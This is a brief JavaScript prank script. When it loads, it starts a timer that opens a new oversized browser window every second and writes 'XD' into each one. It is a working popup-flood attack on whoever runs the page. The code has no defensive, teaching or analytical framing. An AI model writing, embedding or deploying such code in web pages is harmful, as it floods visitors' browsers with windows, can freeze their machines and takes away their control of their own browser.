function openAnnoyingWindow() {
  const win = window.open("", "", "width=9999,height=9999");
  win.document.write("<h1>XD</h1>");
}

function startAnnoying() {
  setInterval(openAnnoyingWindow, 1000);
}

startAnnoying();